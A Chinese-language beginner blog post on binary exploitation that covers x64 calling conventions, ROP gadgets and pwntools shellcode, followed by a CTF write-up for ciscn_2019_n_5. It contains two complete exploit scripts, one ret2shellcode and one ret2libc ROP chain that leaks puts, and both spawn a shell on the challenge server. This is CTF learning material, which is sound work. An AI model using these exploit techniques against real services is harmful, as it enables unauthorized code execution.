---
layout: post
title: pwn入门
subheading: 栈溢出相关知识
author: xyccq
categories: 无
tags: Pwn
---

#### 栈溢出

​	暂时无时间记录，等以后有时间了补上。

#### 函数传参（x86与x64的区别）：

​	x86的参数都保存在栈上面，而x64中的前6个参数依次保存在RDI, RSI, RDX, RCX, R8和R9中，如果还有更多的参数时才会保存在栈上。

​	因此在64位的程序上，要寻找pop rdi;ret这样的指令来进行传参。如何找到这些指令呢，用ROPgadget这个工具。

```ROPgadget --binary ./filename --only "pop|ret"```

​	这个指令具体怎么用，有时间自习研究一番继续补上。

​	当我们得到了pop rdi;ret指令的地址后，就可以构造payload，例如下面

```python
payload = padding + p64(pop_rdi) + p64(bin_addr) + p64(sys_addr)
```

​	这里相当于将bin_addr的内容作为pop参数移入rdi寄存器中，然后ret返回，继续执行system函数，并将rdi中的内容作为system的参数，即可执行system('bin\sh')从而getshell。（暂时是这么理解，如果有错误请师傅指正，以后如果发现理解错了再返回来修改...）



#### shellcode

```asm(shellcraft.sh())```该函数能自动生成shellcode，在一些RWX段可以直接写入并接在后面运行。

注：在使用这个函数前，一定用```context.arh="xxx"```写明程序架构。



#### 一道例题（ciscn_2019_n_5)

​	一道有RWX段的例题，做完后看了一遍感觉也能泄露libc来做。于是写了两种解法，权当练手了。虽然ret2text/libc这种大家都会的东西已经很少作为比赛题出现了，但毕竟咱作为新手还是要从基础开始学，多练练总是有益无害的。下面是两种做法：

##### 1.

IDA打开看看代码

<img src="C:\Users\xieyucheng\AppData\Roaming\Typora\typora-user-images\image-20201129200355940.png" alt="image-20201129200355940" style="zoom:67%;" />

看见程序有两处输入，发现name在.bss段上，用vmmap查看该段是RWX段。

<img src="C:\Users\xieyucheng\AppData\Roaming\Typora\typora-user-images\image-20201129200605666.png" alt="image-20201129200605666" style="zoom: 67%;" /> <img src="C:\Users\xieyucheng\AppData\Roaming\Typora\typora-user-images\image-20201129200717199.png" alt="image-20201129200717199" style="zoom: 67%;" />

第二次输入用了gets函数，显然存在栈溢出，那么第一种解法已经呼之欲出了，写exp如下

```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
#p = process('./ciscn_2019_n_5')
p = remote('node3.buuoj.cn',28497)
bss_addr = 0x601080
p.sendline(asm(shellcraft.sh()))
padding = b'a'*(0x20+0x8)
payload = padding + p64(bss_addr)
p.sendline(payload)
p.interactive()
```

用```asm(shellcraft.sh())```生成shellcode并写入name，栈溢出执行该段代码即可getshell

##### 2.

代码分析如1，同时注意到程序中有puts函数，那么应该可以泄露出put的地址，那么就可以用LibcSearcher找到对应libc版本，从而计算出libc的基址，也即setoff。那么就能找到system函数以及字符串bin/sh的地址，构造ROP链即可getshell。直接上代码

```python
from pwn import *
from LibcSearcher import *
#context.log_level = 'debug'
context.arch = 'amd64'
#p = process('./ciscn_2019_n_5')
p = remote('node3.buuoj.cn',27811)
elf = ELF('./ciscn_2019_n_5')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
ret = 0x00000000004004c9
pop_rdi = 0x0000000000400713
main = 0x400636
p.sendline('1')

payload = b'a'*(0x20+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendline(payload)
print(p.recvuntil('me?\n'))
puts_addr = u64(p.recv(7)[:-1].ljust(8,b'\x00'))
libc = LibcSearcher('puts',puts_addr)
setoff = puts_addr - libc.dump('puts')
sys_addr = setoff + libc.dump('system')
bin_addr = setoff + libc.dump('str_bin_sh')

p.sendline('1')
print(p.recv())
print(p.recvuntil('me?\n'))
payload2 = b'a'*(0x20+0x8) + p64(pop_rdi) + p64(bin_addr) + p64(ret) + p64(sys_addr)
p.sendline(payload2)
p.interactive()
```

其中payload2中的ret用于平衡栈（具体原理等我搞明白了回来填坑，反正ubuntu18版本及以上如果不能getshell就加个ret试试）。